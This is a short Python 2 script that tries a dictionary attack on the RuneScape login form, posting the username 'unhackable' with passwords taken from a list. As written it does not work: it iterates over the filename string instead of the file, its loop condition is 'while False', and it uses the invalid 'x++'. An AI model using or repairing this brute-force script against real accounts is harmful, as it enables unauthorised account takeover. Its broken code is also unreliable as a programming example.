import urllib
import urllib2
import cookielib

passwords = []
x = 0
url = "https://secure.runescape.com/m=weblogin/loginform.ws?mod=www&ssl=1&expired=0&dest=account_settings.ws"
passText = "passes.txt"

for line in passText: #the file containing the dictionary
	passwords.append(line) # append our line read into the passwords list 

#Create empty cookie jar.
cj = cookielib.LWPCookieJar()
#Install cookie handler for urllib2.
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
urllib2.install_opener(opener)
 
request = urllib2.Request(url, None)
f = urllib2.urlopen(request)
f.close()
 
# this is just to log into the site first ...
while False:
	data = urllib.urlencode({"Email / Username": "unhackable", "Password" : passwords[x]}) # x is the line that we're pulling our word from with 0 being the first word and 1 being the next line and so on
	request = urllib2.Request(url, data)
	f = urllib2.urlopen(request)
	x++